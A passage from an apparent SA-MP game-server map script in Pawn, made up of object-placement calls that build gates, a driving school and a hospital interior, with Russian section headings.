CreateDynamicObject(985,-1936.09155273,239.35530090,33.35829926,0.00000000,0.00000000,0.00000000); //object(gate_autor) (4)
CreateDynamicObject(985,-2716.29931641,217.70559692,3.81780005,0.00000000,0.00000000,270.00000000); //object(gate_autor) (5)
//------ПЕИНТСПРЕИ
CreateDynamicObject(985,2071.55957031,-1830.89941406,13.27190018,0.00000000,0.00000000,270.00000000); //object(gate_autor) (1)
CreateDynamicObject(985,-100.27929688,1111.41601562,20.01329994,0.00000000,0.00000000,0.00000000); //object(gate_autor) (4)
CreateDynamicObject(985,1025.86328125,-1029.44335938,32.10820007,0.00000000,0.00000000,179.99450684); //object(gate_autor) (5)
CreateDynamicObject(985,488.25097656,-1735.01953125,10.96949959,0.00000000,0.00000000,351.99096680); //object(gate_autor) (6)
CreateDynamicObject(985,720.22558594,-462.54101562,15.56089973,0.00000000,0.00000000,0.00000000); //object(gate_autor) (7)
CreateDynamicObject(985,-1420.88085938,2591.22949219,56.42670059,0.00000000,0.00000000,0.00000000); //object(gate_autor) (8)
CreateDynamicObject(985,1968.25695801,2162.12036133,10.69530010,0.00000000,0.00000000,91.50000000); //object(gate_autor) (9)
CreateDynamicObject(985,-1904.25036621,277.63220215,41.69699860,0.00000000,0.00000000,179.74963379); //object(gate_autor) (10)
CreateDynamicObject(985,-2425.93164062,1028.08691406,50.66960144,0.00000000,0.00000000,359.99450684); //object(gate_autor) (12)
//======================================АвтоШкола========================================
CreateDynamicObject(966, -2057.36, -101.18, 34.16,   0.00, 0.00, -91.92);
CreateDynamicObject(9131, -2057.12, -91.23, 34.81,   0.00, 0.00, 0.00);
CreateDynamicObject(1257,-2018.51037598,-84.02770233,36.05590057,0.00000000,0.00000000,0.00000000); //object(bustopm) (1)
CreateDynamicObject(19447,-2032.00219727,-85.91970062,34.69079971,0.00000000,90.00000000,270.00000000); //object(wall087) (1)
CreateDynamicObject(19447,-2032.01220703,-82.46949768,34.69079971,0.00000000,90.00000000,270.00000000); //object(wall087) (2)
CreateDynamicObject(19447,-2022.44274902,-85.93070221,34.69079971,0.00000000,90.00000000,270.00000000); //object(wall087) (3)
CreateDynamicObject(19447,-2022.41162109,-82.47940063,34.69079971,0.00000000,90.00000000,270.00000000); //object(wall087) (4)
CreateDynamicObject(3934,-2028.35095215,-110.86720276,37.92190170,0.00000000,0.00000000,0.00000000); //object(helipad01) (1)
CreateDynamicObject(8572,-2018.22753906,-117.41390228,36.41289902,0.00000000,0.00000000,90.00000000); //object(vgssstairs02_lvs) (2)
CreateDynamicObject(8572,-2018.22753906,-117.41308594,36.41289902,0.00000000,0.00000000,90.00000000); //object(vgssstairs02_lvs) (3)
CreateDynamicObject(1656,-2019.05004883,-115.53990173,37.69089890,0.00000000,0.00000000,90.00000000); //object(esc_step) (1)
CreateDynamicObject(2633,-2020.74877930,-103.88230133,36.23870087,0.00000000,0.00000000,0.00000000); //object(crack_walkway1) (1)
CreateDynamicObject(2633,-2025.01281738,-103.88860321,36.23870087,0.00000000,0.00000000,0.00000000); //object(crack_walkway1) (2)
CreateDynamicObject(2633,-2029.22924805,-103.89129639,36.23870087,0.00000000,0.00000000,0.00000000); //object(crack_walkway1) (3)
CreateDynamicObject(2633,-2033.47863770,-103.89450073,36.23870087,0.00000000,0.00000000,0.00000000); //object(crack_walkway1) (4)
CreateDynamicObject(2633,-2035.07958984,-103.91439819,36.23870087,0.00000000,0.00000000,0.00000000); //object(crack_walkway1) (6)
CreateDynamicObject(737,-2089.14233398,-77.79540253,34.42029953,0.00000000,0.00000000,0.00000000); //object(aw_streettree3) (3)
CreateDynamicObject(737,-2075.66430664,-77.88480377,34.42029953,0.00000000,0.00000000,0.00000000); //object(aw_streettree3) (4)
CreateDynamicObject(737,-2061.67163086,-77.74530029,34.42029953,0.00000000,0.00000000,0.00000000); //object(aw_streettree3) (5)
CreateDynamicObject(1569,-2025.87084961,-102.46800232,34.26869965,0.00000000,0.00000000,179.75000000); //object(adam_v_door) (1)
CreateDynamicObject(1569,-2025.96801758,-103.90219879,34.21870041,0.00000000,0.00000000,86.74731445); //object(adam_v_door) (2)
CreateDynamicObject(1649,-2032.27124023,-102.52829742,35.82979965,0.00000000,0.00000000,180.00000000); //object(wglasssmash) (1)
CreateDynamicObject(1649,-2032.27050781,-102.52734375,35.82979965,0.00000000,0.00000000,179.99450684); //object(wglasssmash) (2)
CreateDynamicObject(1649,-2032.27050781,-102.52734375,35.82979965,0.00000000,0.00000000,179.99450684); //object(wglasssmash) (3)
CreateDynamicObject(1649,-2022.39038086,-102.50599670,35.82979965,0.00000000,0.00000000,180.00000000); //object(wglasssmash) (4)
CreateDynamicObject(1649,-2022.38964844,-102.50585938,35.82979965,0.00000000,0.00000000,179.99450684); //object(wglasssmash) (6)
CreateDynamicObject(1649,-2022.38964844,-102.50585938,35.82979965,0.00000000,0.00000000,179.99450684); //object(wglasssmash) (7)
CreateDynamicObject(1649,-2022.38964844,-102.50585938,35.82979965,0.00000000,0.00000000,179.99450684); //object(wglasssmash) (8)
CreateDynamicObject(973,-2017.27478027,-92.60359955,34.97930145,0.00000000,0.00000000,90.00000000); //object(sub_roadbarrier) (3)
CreateDynamicObject(973,-2017.27441406,-92.60351562,34.97930145,0.00000000,0.00000000,270.00000000); //object(sub_roadbarrier) (4)
CreateDynamicObject(973,-2017.26684570,-99.51429749,34.97930145,0.00000000,0.00000000,270.00000000); //object(sub_roadbarrier) (5)
CreateDynamicObject(973,-2017.26660156,-99.51367188,34.97930145,0.00000000,0.00000000,90.00000000); //object(sub_roadbarrier) (6)
CreateDynamicObject(983,-2017.27917480,-84.06420135,35.50389862,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (1)
CreateDynamicObject(1251,-2017.22753906,-100.52700043,34.92530060,0.00000000,0.00000000,0.00000000); //object(smashbar) (1)
CreateDynamicObject(1251,-2017.25500488,-91.39420319,34.92530060,0.00000000,0.00000000,0.00000000); //object(smashbar) (2)
CreateDynamicObject(1251,-2017.25439453,-96.08439636,34.92530060,0.00000000,0.00000000,0.00000000); //object(smashbar) (3)
CreateDynamicObject(1256,-2036.16735840,-82.28649902,35.43619919,0.00000000,0.00000000,180.00000000); //object(stonebench1) (1)
CreateDynamicObject(1256,-2036.13867188,-85.81250000,35.43619919,0.00000000,0.00000000,179.99951172); //object(stonebench1) (2)
CreateDynamicObject(2010,-2036.21655273,-84.10250092,34.72940063,0.00000000,0.00000000,0.00000000); //object(nu_plant3_ofc) (1)
CreateDynamicObject(19078,-2036.53344727,-81.38410187,35.90579987,0.00000000,276.49987793,275.99993896); //object(theparrot1) (1)
CreateDynamicObject(19447,-2022.41113281,-82.47851562,34.69079971,0.00000000,90.00000000,270.00000000); //object(wall087) (5)
CreateDynamicObject(983,-2036.94104004,-83.97290039,35.05390167,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (3)
CreateDynamicObject(9131,-2036.81604004,-87.49430084,35.19919968,0.00000000,0.00000000,89.25000000); //object(shbbyhswall13_lvs) (1)
CreateDynamicObject(9131,-2036.81994629,-80.60710144,35.19919968,0.00000000,0.00000000,0.74743652); //object(shbbyhswall13_lvs) (2)
CreateDynamicObject(9131,-2017.49743652,-80.63690186,35.19919968,0.00000000,0.00000000,270.99707031); //object(shbbyhswall13_lvs) (3)
CreateDynamicObject(9131,-2017.55603027,-87.54940033,35.19919968,0.00000000,0.00000000,180.99426270); //object(shbbyhswall13_lvs) (4)
CreateDynamicObject(9915,-2027.34204102,-94.28569794,21.42180061,0.00000000,0.00000000,92.00000000); //object(sfe_park) (1)
CreateDynamicObject(3277,-2026.93603516,-84.32879639,34.27669907,0.00000000,0.00000000,344.25000000); //object(mil_sambase) (1)
CreateDynamicObject(3277,-2026.93554688,-84.32812500,34.27669907,0.00000000,0.00000000,194.24560547); //object(mil_sambase) (2)
CreateDynamicObject(869,-2026.91345215,-84.43900299,35.22660065,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (1)
CreateDynamicObject(869,-2026.91308594,-84.43847656,35.22660065,0.00000000,0.00000000,250.00000000); //object(veg_pflowerswee) (2)
CreateDynamicObject(1364,-2056.00341797,-85.43910217,35.10440063,0.00000000,0.00000000,90.00000000); //object(cj_bush_prop) (1)
CreateDynamicObject(1364,-2058.43457031,-85.15830231,35.10440063,0.00000000,0.00000000,269.99499512); //object(cj_bush_prop) (2)
CreateDynamicObject(751,-2027.90478516,-84.60610199,29.73600006,0.00000000,0.00000000,0.00000000); //object(sm_scrb_column1) (1)
CreateDynamicObject(751,-2026.54296875,-84.04730225,29.73600006,0.00000000,0.00000000,0.00000000); //object(sm_scrb_column1) (2)
CreateDynamicObject(751,-2025.81542969,-84.69539642,29.73600006,0.00000000,0.00000000,0.00000000); //object(sm_scrb_column1) (3)
CreateDynamicObject(751,-2027.66442871,-85.42990112,29.73600006,0.00000000,0.00000000,0.00000000); //object(sm_scrb_column1) (4)
CreateDynamicObject(751,-2026.55236816,-85.51899719,29.73600006,0.00000000,0.00000000,0.00000000); //object(sm_scrb_column1) (5)
CreateDynamicObject(19450,-2057.18579102,-84.74900055,33.42039871,0.00000000,0.00000000,0.00000000); //object(wall090) (1)
CreateDynamicObject(19450,-2061.91699219,-80.04940033,33.42039871,0.00000000,0.00000000,90.25000000); //object(wall090) (2)
CreateDynamicObject(19450,-2071.33593750,-80.08820343,33.42039871,0.00000000,0.00000000,90.24719238); //object(wall090) (3)
CreateDynamicObject(19450,-2080.51928711,-80.13330078,33.42039871,0.00000000,0.00000000,90.24719238); //object(wall090) (4)
CreateDynamicObject(19450,-2089.76831055,-80.17279816,33.42039871,0.00000000,0.00000000,90.24719238); //object(wall090) (5)
CreateDynamicObject(19450,-2099.22998047,-80.85820007,33.42039871,0.00000000,0.00000000,97.99719238); //object(wall090) (6)
CreateDynamicObject(19431,-2057.21313477,-90.20739746,35.04550171,0.00000000,0.00000000,0.00000000); //object(wall071) (1)
CreateDynamicObject(19431,-2057.18945312,-80.84120178,35.04550171,0.00000000,0.00000000,0.00000000); //object(wall071) (2)
CreateDynamicObject(19431,-2057.92065430,-80.05229950,35.04550171,0.00000000,0.00000000,90.00000000); //object(wall071) (3)
CreateDynamicObject(19431,-2095.39892578,-80.33840179,35.04550171,0.00000000,0.00000000,98.00000000); //object(wall071) (5)
CreateDynamicObject(4100,-2088.30664062,-80.22049713,35.37200165,0.00000000,0.00000000,140.50000000); //object(meshfence1_lan) (1)
CreateDynamicObject(4100,-2074.53979492,-80.12840271,35.37200165,0.00000000,0.00000000,140.49865723); //object(meshfence1_lan) (2)
CreateDynamicObject(4100,-2064.26708984,-80.03810120,35.37200165,0.00000000,0.00000000,140.49865723); //object(meshfence1_lan) (3)
CreateDynamicObject(8674,-2057.12719727,-85.51090240,35.08720016,0.00000000,0.00000000,270.00000000); //object(csrsfence02_lvs) (1)
CreateDynamicObject(19450,-2057.19775391,-86.22560120,33.42039871,0.00000000,0.00000000,0.00000000); //object(wall090) (7)
CreateDynamicObject(16023,-2047.16723633,-102.30460358,35.38280106,0.00000000,0.00000000,266.75000000); //object(des_trxingsign02) (1)
CreateDynamicObject(1223,-2017.30822754,-80.45790100,34.32030106,0.00000000,0.00000000,56.00000000); //object(lampost_coast) (1)
CreateDynamicObject(1223,-2037.09960938,-80.35330200,34.32030106,0.00000000,0.00000000,125.99731445); //object(lampost_coast) (2)
CreateDynamicObject(1223,-2037.05163574,-87.77600098,34.32030106,0.00000000,0.00000000,225.99670410); //object(lampost_coast) (3)
CreateDynamicObject(1231,-2057.22680664,-91.01319885,36.62570190,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (1)
CreateDynamicObject(1232,-2057.20703125,-80.13330078,36.05039978,0.00000000,0.00000000,304.25000000); //object(streetlamp1) (1)
CreateDynamicObject(1232,-2072.37011719,-80.07779694,36.05039978,0.00000000,0.00000000,326.24987793); //object(streetlamp1) (2)
CreateDynamicObject(1232,-2084.98144531,-80.14550018,36.05039978,0.00000000,0.00000000,326.24450684); //object(streetlamp1) (3)
CreateDynamicObject(1232,-2095.33715820,-80.35790253,36.05039978,0.00000000,0.00000000,326.24450684); //object(streetlamp1) (4)
//======================================Ферма========================================
CreateObject(16077, -366.472747,-1420.285034,23.836576, 0.000000,0.000000,0.000000);
//======================================Бильница========================================
CreateDynamicObject(14593,1185.00000000,-1326.69995117,1586.30004883,0.00000000,0.00000000,0.00000000); //object(paperchase04) (1)
CreateDynamicObject(14597,1191.90002441,-1353.69995117,1585.96997070,0.00000000,0.00000000,90.00000000); //object(paperchase07) (1)
CreateDynamicObject(2395,1195.17004395,-1340.72998047,1584.40002441,0.00000000,270.00000000,0.00000000); //object(cj_sports_wall) (1)
CreateDynamicObject(2395,1195.17004395,-1340.72998047,1588.09997559,0.00000000,270.00000000,0.00000000); //object(cj_sports_wall) (2)
CreateDynamicObject(2395,1190.19995117,-1340.71997070,1589.69995117,0.00000000,90.00000000,0.00000000); //object(cj_sports_wall) (3)
CreateDynamicObject(2395,1188.21997070,-1340.72998047,1587.19995117,0.00000000,90.00000000,0.00000000); //object(cj_sports_wall) (4)
CreateDynamicObject(2395,1188.21997070,-1340.72998047,1590.90002441,0.00000000,90.00000000,0.00000000); //object(cj_sports_wall) (5)
CreateDynamicObject(1566,1191.40002441,-1312.88000488,1585.40002441,0.00000000,0.00000000,0.00000000); //object(cj_ws_door) (1)
CreateDynamicObject(2395,1195.17004395,-1340.50000000,1587.19995117,0.00000000,90.00000000,180.00000000); //object(cj_sports_wall) (6)
CreateDynamicObject(2395,1188.21997070,-1340.50000000,1584.00000000,0.00000000,270.00000000,179.99450684); //object(cj_sports_wall) (7)
CreateDynamicObject(2395,1190.19897461,-1340.50000000,1586.94702148,0.00000000,270.00000000,179.99450684); //object(cj_sports_wall) (8)
CreateDynamicObject(1569,1190.93994141,-1340.59997559,1583.95996094,0.00000000,0.00000000,80.00000000); //object(adam_v_door) (1)
CreateDynamicObject(1720,1189.69995117,-1334.90002441,1584.00000000,0.00000000,0.00000000,90.00000000); //object(rest_chair) (1)
CreateDynamicObject(1720,1189.69995117,-1335.59997559,1584.00000000,0.00000000,0.00000000,90.00000000); //object(rest_chair) (2)
CreateDynamicObject(1720,1189.69995117,-1336.30004883,1584.00000000,0.00000000,0.00000000,90.00000000); //object(rest_chair) (3)
CreateDynamicObject(1720,1189.69995117,-1337.00000000,1584.00000000,0.00000000,0.00000000,90.00000000); //object(rest_chair) (4)
CreateDynamicObject(1720,1188.90002441,-1330.00000000,1584.00000000,0.00000000,0.00000000,180.00000000); //object(rest_chair) (5)
CreateDynamicObject(2166,1182.40002441,-1330.00000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(med_office_desk_2) (1)
CreateDynamicObject(2169,1184.40002441,-1329.00000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(med_office3_desk_1) (1)
CreateDynamicObject(2169,1186.40002441,-1329.00000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(med_office3_desk_1) (2)
CreateDynamicObject(2169,1188.40002441,-1329.00000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(med_office3_desk_1) (3)
CreateDynamicObject(1720,1187.00000000,-1330.00000000,1584.00000000,0.00000000,0.00000000,179.99450684); //object(rest_chair) (6)
CreateDynamicObject(1720,1184.90002441,-1329.80004883,1584.00000000,0.00000000,0.00000000,179.99450684); //object(rest_chair) (7)
CreateDynamicObject(1715,1183.50000000,-1330.40002441,1584.00000000,0.00000000,0.00000000,230.00000000); //object(kb_swivelchair2) (1)
CreateDynamicObject(2894,1189.30004883,-1328.90002441,1584.80004883,0.00000000,0.00000000,332.00000000); //object(kmb_rhymesbook) (1)
CreateDynamicObject(2190,1186.59997559,-1328.59997559,1584.80004883,0.00000000,0.00000000,0.00000000); //object(pc_1) (1)
CreateDynamicObject(2190,1184.50000000,-1328.50000000,1584.80004883,0.00000000,0.00000000,0.00000000); //object(pc_1) (2)
CreateDynamicObject(1723,1184.69995117,-1316.90002441,1584.00000000,0.00000000,0.00000000,0.00000000); //object(mrk_seating1) (1)
CreateDynamicObject(1433,1183.50000000,-1316.90002441,1584.19995117,0.00000000,0.00000000,0.00000000); //object(dyn_table_1) (1)
CreateDynamicObject(1723,1180.30004883,-1316.90002441,1584.00000000,0.00000000,0.00000000,0.00000000); //object(mrk_seating1) (2)
CreateDynamicObject(2280,1188.19995117,-1313.40002441,1586.19995117,0.00000000,0.00000000,0.00000000); //object(frame_thick_1) (1)
CreateDynamicObject(2268,1179.50000000,-1313.40002441,1586.59997559,0.00000000,0.00000000,0.00000000); //object(frame_wood_2) (1)
CreateDynamicObject(2267,1189.09997559,-1337.09997559,1586.19995117,0.00000000,0.00000000,90.00000000); //object(frame_wood_3) (1)
CreateDynamicObject(2596,1195.69995117,-1346.40002441,1587.50000000,0.00000000,0.00000000,90.00000000); //object(cj_sex_tv) (1)
CreateDynamicObject(1796,1205.00000000,-1346.30004883,1584.00000000,0.00000000,0.00000000,180.00000000); //object(low_bed_4) (1)
CreateDynamicObject(1796,1201.90002441,-1346.30004883,1584.00000000,0.00000000,0.00000000,179.99450684); //object(low_bed_4) (2)
CreateDynamicObject(1796,1199.00000000,-1346.40002441,1584.00000000,0.00000000,0.00000000,179.99450684); //object(low_bed_4) (3)
CreateDynamicObject(1796,1196.09997559,-1346.40002441,1584.00000000,0.00000000,0.00000000,179.99450684); //object(low_bed_4) (4)
CreateDynamicObject(1796,1197.80004883,-1345.90002441,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (5)
CreateDynamicObject(1796,1201.69995117,-1345.90002441,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (6)
CreateDynamicObject(1796,1204.80004883,-1345.90002441,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (7)
CreateDynamicObject(1796,1187.90002441,-1346.30004883,1584.00000000,0.00000000,0.00000000,179.99450684); //object(low_bed_4) (8)
CreateDynamicObject(1796,1185.09997559,-1346.40002441,1584.00000000,0.00000000,0.00000000,179.99450684); //object(low_bed_4) (9)
CreateDynamicObject(1796,1182.00000000,-1346.40002441,1584.00000000,0.00000000,0.00000000,179.99450684); //object(low_bed_4) (10)
CreateDynamicObject(1796,1179.09997559,-1346.30004883,1584.00000000,0.00000000,0.00000000,179.99450684); //object(low_bed_4) (11)
CreateDynamicObject(1796,1186.30004883,-1346.00000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (12)
CreateDynamicObject(1796,1182.19995117,-1345.90002441,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (13)
CreateDynamicObject(1796,1178.80004883,-1345.90002441,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (14)
CreateDynamicObject(2131,1205.50000000,-1345.59997559,1584.00000000,0.00000000,0.00000000,270.00000000); //object(cj_kitch2_fridge) (1)
CreateDynamicObject(2186,1193.19995117,-1358.80004883,1584.00000000,0.00000000,0.00000000,0.00000000); //object(photocopier_1) (1)
CreateDynamicObject(2190,1191.19995117,-1363.00000000,1584.90002441,0.00000000,0.00000000,0.00000000); //object(pc_1) (3)
CreateDynamicObject(2339,1196.69995117,-1342.50000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(cj_kitch2_cooker) (1)
CreateDynamicObject(2339,1200.59997559,-1342.50000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(cj_kitch2_cooker) (2)
CreateDynamicObject(2339,1203.69995117,-1342.50000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(cj_kitch2_cooker) (3)
CreateDynamicObject(2339,1203.69995117,-1349.69995117,1584.00000000,0.00000000,0.00000000,180.00000000); //object(cj_kitch2_cooker) (4)
CreateDynamicObject(2339,1200.59997559,-1349.69995117,1584.00000000,0.00000000,0.00000000,179.99450684); //object(cj_kitch2_cooker) (5)
CreateDynamicObject(2339,1197.69995117,-1349.69995117,1584.00000000,0.00000000,0.00000000,179.99450684); //object(cj_kitch2_cooker) (6)
CreateDynamicObject(2257,1199.80004883,-1349.80004883,1586.59997559,0.00000000,180.00000000,180.00000000); //object(frame_clip_4) (1)
CreateDynamicObject(2196,1204.50000000,-1342.19995117,1585.04003906,0.00000000,0.00000000,0.00000000); //object(work_lamp1) (1)
CreateDynamicObject(2196,1201.30004883,-1342.69995117,1585.04003906,0.00000000,0.00000000,302.00000000); //object(work_lamp1) (2)
CreateDynamicObject(2196,1197.30004883,-1342.69995117,1585.04003906,0.00000000,0.00000000,301.99768066); //object(work_lamp1) (3)
CreateDynamicObject(1811,1196.00000000,-1346.80004883,1584.59997559,0.00000000,0.00000000,188.00000000); //object(med_din_chair_5) (1)
CreateDynamicObject(2196,1204.00000000,-1349.25000000,1585.04003906,0.00000000,0.00000000,21.99768066); //object(work_lamp1) (4)
CreateDynamicObject(2196,1200.69995117,-1349.19995117,1585.04003906,0.00000000,0.00000000,40.00000000); //object(work_lamp1) (5)
CreateDynamicObject(2196,1197.80004883,-1349.19995117,1585.04003906,0.00000000,0.00000000,39.99572754); //object(work_lamp1) (6)
CreateDynamicObject(2339,1187.59997559,-1342.59997559,1584.00000000,0.00000000,0.00000000,0.00000000); //object(cj_kitch2_cooker) (8)
CreateDynamicObject(2339,1183.50000000,-1342.59997559,1584.00000000,0.00000000,0.00000000,0.00000000); //object(cj_kitch2_cooker) (9)
CreateDynamicObject(2339,1180.09997559,-1342.59997559,1584.00000000,0.00000000,0.00000000,0.00000000); //object(cj_kitch2_cooker) (10)
CreateDynamicObject(2339,1180.50000000,-1349.69995117,1584.05004883,0.00000000,0.00000000,180.00000000); //object(cj_kitch2_cooker) (11)
CreateDynamicObject(2339,1183.80004883,-1349.69995117,1584.00000000,0.00000000,0.00000000,179.99450684); //object(cj_kitch2_cooker) (12)
CreateDynamicObject(2339,1186.59997559,-1349.69995117,1584.00000000,0.00000000,0.00000000,179.99450684); //object(cj_kitch2_cooker) (13)
CreateDynamicObject(2131,1178.30004883,-1346.59997559,1584.00000000,0.00000000,0.00000000,90.00000000); //object(cj_kitch2_fridge) (2)
CreateDynamicObject(1811,1187.90002441,-1346.80004883,1584.59997559,0.00000000,0.00000000,338.00000000); //object(med_din_chair_5) (2)
CreateDynamicObject(2258,1183.59997559,-1342.50000000,1586.69995117,0.00000000,0.00000000,0.00000000); //object(frame_clip_5) (1)
CreateDynamicObject(1778,1194.80004883,-1340.69995117,1584.00000000,0.00000000,0.00000000,0.00000000); //object(cj_mop_pail) (1)
CreateDynamicObject(2596,1188.09997559,-1346.19995117,1587.50000000,0.00000000,0.00000000,270.00000000); //object(cj_sex_tv) (2)
CreateDynamicObject(2813,1180.50000000,-1349.59997559,1585.09997559,0.00000000,0.00000000,0.00000000); //object(gb_novels01) (1)
CreateDynamicObject(2816,1180.09997559,-1342.59997559,1585.09997559,0.00000000,0.00000000,0.00000000); //object(gb_bedmags01) (1)
CreateDynamicObject(1796,1195.90002441,-1353.80004883,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (15)
CreateDynamicObject(1796,1198.80004883,-1353.69995117,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (16)
CreateDynamicObject(1796,1201.90002441,-1353.69995117,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (17)
CreateDynamicObject(1796,1204.69995117,-1353.69995117,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (18)
CreateDynamicObject(1796,1205.00000000,-1354.19995117,1584.00000000,0.00000000,0.00000000,179.99450684); //object(low_bed_4) (19)
CreateDynamicObject(1796,1201.50000000,-1354.19995117,1584.00000000,0.00000000,0.00000000,179.99450684); //object(low_bed_4) (20)
CreateDynamicObject(1796,1197.69995117,-1354.19995117,1584.00000000,0.00000000,0.00000000,179.99450684); //object(low_bed_4) (21)
CreateDynamicObject(1796,1179.00000000,-1354.09997559,1584.00000000,0.00000000,0.00000000,179.99450684); //object(low_bed_4) (22)
CreateDynamicObject(1796,1182.19995117,-1354.19995117,1584.00000000,0.00000000,0.00000000,179.99450684); //object(low_bed_4) (23)
CreateDynamicObject(1796,1186.00000000,-1354.19995117,1584.00000000,0.00000000,0.00000000,179.99450684); //object(low_bed_4) (24)
CreateDynamicObject(1796,1187.69995117,-1353.69995117,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (25)
CreateDynamicObject(1796,1184.69995117,-1353.69995117,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (26)
CreateDynamicObject(1796,1181.69995117,-1353.69995117,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (27)
CreateDynamicObject(1796,1178.80004883,-1353.69995117,1584.00000000,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (28)
CreateDynamicObject(2339,1180.09997559,-1350.50000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(cj_kitch2_cooker) (14)
CreateDynamicObject(2339,1183.00000000,-1350.50000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(cj_kitch2_cooker) (15)
CreateDynamicObject(2339,1186.00000000,-1350.50000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(cj_kitch2_cooker) (16)
CreateDynamicObject(1811,1187.69995117,-1353.30004883,1584.59997559,0.00000000,358.00000000,57.99987793); //object(med_din_chair_5) (3)
CreateDynamicObject(2339,1187.09997559,-1357.30004883,1584.05004883,0.00000000,0.00000000,179.99450684); //object(cj_kitch2_cooker) (17)
CreateDynamicObject(2339,1183.30004883,-1357.40002441,1584.00000000,0.00000000,0.00000000,179.99450684); //object(cj_kitch2_cooker) (18)
CreateDynamicObject(2339,1180.09997559,-1357.40002441,1584.00000000,0.00000000,0.00000000,179.99450684); //object(cj_kitch2_cooker) (19)
CreateDynamicObject(2131,1178.30004883,-1354.40002441,1584.00000000,0.00000000,0.00000000,90.00000000); //object(cj_kitch2_fridge) (3)
CreateDynamicObject(2196,1183.30004883,-1356.80004883,1585.04003906,0.00000000,0.00000000,39.99572754); //object(work_lamp1) (7)
CreateDynamicObject(2813,1187.09997559,-1357.30004883,1585.09997559,0.00000000,0.00000000,0.00000000); //object(gb_novels01) (2)
CreateDynamicObject(2256,1183.59997559,-1350.50000000,1586.59997559,0.00000000,0.00000000,0.00000000); //object(frame_clip_3) (1)
CreateDynamicObject(2596,1188.09997559,-1355.59997559,1587.50000000,0.00000000,0.00000000,269.99450684); //object(cj_sex_tv) (3)
CreateDynamicObject(2596,1195.69995117,-1353.90002441,1587.50000000,0.00000000,0.00000000,90.00000000); //object(cj_sex_tv) (4)
CreateDynamicObject(2131,1205.50000000,-1353.50000000,1584.00000000,0.00000000,0.00000000,269.99450684); //object(cj_kitch2_fridge) (4)
CreateDynamicObject(2339,1203.69995117,-1357.50000000,1584.00000000,0.00000000,0.00000000,179.99450684); //object(cj_kitch2_cooker) (20)
CreateDynamicObject(2339,1200.19995117,-1357.50000000,1584.00000000,0.00000000,0.00000000,179.99450684); //object(cj_kitch2_cooker) (21)
CreateDynamicObject(2339,1196.40002441,-1357.50000000,1584.00000000,0.00000000,0.00000000,179.99450684); //object(cj_kitch2_cooker) (22)
CreateDynamicObject(2339,1197.19995117,-1350.50000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(cj_kitch2_cooker) (23)
CreateDynamicObject(2339,1200.09997559,-1350.50000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(cj_kitch2_cooker) (24)
CreateDynamicObject(2339,1203.19995117,-1350.50000000,1584.00000000,0.00000000,0.00000000,0.00000000); //object(cj_kitch2_cooker) (25)
CreateDynamicObject(1811,1196.00000000,-1353.30004883,1584.59997559,0.00000000,0.00000000,107.99804688); //object(med_din_chair_5) (4)
CreateDynamicObject(2259,1200.59997559,-1350.80004883,1586.19995117,0.00000000,0.00000000,0.00000000); //object(frame_clip_6) (1)
CreateDynamicObject(2196,1200.59997559,-1350.80004883,1585.09997559,0.00000000,0.00000000,301.99768066); //object(work_lamp1) (8)
CreateDynamicObject(2161,1190.09997559,-1366.80004883,1584.00000000,0.00000000,0.00000000,180.00000000); //object(med_office_unit_4) (1)
CreateDynamicObject(2161,1191.40002441,-1366.80004883,1584.00000000,0.00000000,0.00000000,179.99450684); //object(med_office_unit_4) (2)
CreateDynamicObject(2161,1192.69995117,-1366.80004883,1584.00000000,0.00000000,0.00000000,179.99450684); //object(med_office_unit_4) (3)
CreateDynamicObject(2161,1194.00000000,-1366.80004883,1584.00000000,0.00000000,0.00000000,179.99450684); //object(med_office_unit_4) (4)
CreateDynamicObject(2163,1190.54101562,-1366.80004883,1585.33996582,0.00000000,0.00000000,180.00000000); //object(med_office_unit_2) (1)
CreateDynamicObject(2163,1193.98999023,-1366.80004883,1585.33996582,0.00000000,0.00000000,179.99450684); //object(med_office_unit_2) (2)
CreateDynamicObject(2258,1191.90002441,-1366.80004883,1586.59997559,0.00000000,0.00000000,180.00000000); //object(frame_clip_5) (2)
CreateDynamicObject(2206,1191.00000000,-1363.30004883,1584.00000000,0.00000000,0.00000000,0.00000000); //object(med_office8_desk_02) (1)
CreateDynamicObject(1714,1191.90002441,-1364.69995117,1584.00000000,0.00000000,0.00000000,180.00000000); //object(kb_swivelchair1) (1)
CreateDynamicObject(2894,1192.80004883,-1363.19995117,1584.93005371,0.00000000,0.00000000,328.00000000); //object(kmb_rhymesbook) (2)
CreateDynamicObject(1708,1189.69995117,-1359.59997559,1584.00000000,0.00000000,0.00000000,90.00000000); //object(kb_chair02) (2)
CreateDynamicObject(1708,1189.69995117,-1361.09997559,1584.00000000,0.00000000,0.00000000,90.00000000); //object(kb_chair02) (3)
CreateDynamicObject(1715,1193.09997559,-1361.90002441,1584.00000000,0.00000000,0.00000000,325.00000000); //object(kb_swivelchair2) (2)
